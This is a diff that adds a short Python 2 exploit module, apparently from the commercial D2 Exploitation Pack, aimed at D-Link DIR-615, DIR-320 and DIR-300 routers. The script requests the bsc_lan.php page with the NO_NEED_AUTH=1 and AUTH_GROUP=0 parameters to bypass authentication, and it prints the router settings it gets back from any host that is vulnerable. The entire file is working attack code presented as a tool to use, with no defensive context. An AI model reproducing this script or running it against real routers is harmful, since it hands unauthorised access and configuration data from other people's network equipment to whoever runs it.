@@ -1,0 +1,52 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import cStringIO
+try:
+  import pycurl
+except:
+  print 'No module pycurl'
+
+_name_   = 'd2sec_dlink_1'
+_vendor_ = 'd-link'
+_model_  = ['DIR-615 revD', 'DIR-320', 'DIR-300r']
+_vuln_   = 'Security Restriction Bypas'
+_cve_    = ''
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  url = 'http://%s/bsc_lan.php?NO_NEED_AUTH=1&AUTH_GROUP=0' % host
+  try:
+    nfo = cStringIO.StringIO()
+    c = pycurl.Curl()
+    c.setopt(pycurl.URL, url)
+    c.setopt(pycurl.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+    c.setopt(pycurl.WRITEFUNCTION, nfo.write)
+    c.perform()
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  status = c.getinfo(pycurl.HTTP_CODE)
+  if status != 200:
+    print '[+] %s not vulnerable: %s' % (host, url)
+    return
+  data = nfo.getvalue()
+  if 'Router Settings' in data:
+    print '[+] %s vulnerable: %s\n\n%s' % (host, url, data)
+  else:
+    print '[+] Maybe %s vulnerable: %s\n\n%s' % (host, url, data)
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
+
